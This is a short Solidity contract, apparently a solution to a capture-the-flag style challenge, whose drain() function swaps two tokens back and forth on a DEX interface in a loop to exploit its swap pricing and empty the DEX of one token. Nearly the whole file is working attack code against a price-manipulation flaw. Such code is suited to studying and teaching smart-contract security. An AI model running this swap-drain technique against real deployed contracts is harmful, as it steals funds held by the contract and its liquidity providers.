//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Dex {
    function token1() view external returns (address);
    function token2() view external returns (address);
    function swap(address from, address to, uint amount) external;
    function add_liquidity(address token_address, uint amount) external;
    function get_swap_price(address from, address to, uint amount) external view returns(uint);
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
}

contract Rex {
    function drain(address _dex) external {
        Dex(_dex).approve(_dex, 1e25);

        address _t1 = Dex(_dex).token1();
        address _t2 = Dex(_dex).token2();

        for (uint i = 0; i < 3; i++) {
            uint playerBal = Dex(_dex).balanceOf(_t1, address(this));
            uint dexBal = Dex(_dex).balanceOf(_t1, _dex);
            Dex(_dex).swap(_t1, _t2, playerBal > dexBal ? dexBal : playerBal);

            playerBal = Dex(_dex).balanceOf(_t2, address(this));
            dexBal = Dex(_dex).balanceOf(_t2, _dex);
            Dex(_dex).swap(_t2, _t1, playerBal > dexBal ? dexBal : playerBal);
            
            console.log("t1: %s", Dex(_dex).balanceOf(_t1, address(this)));
        }
    }
}
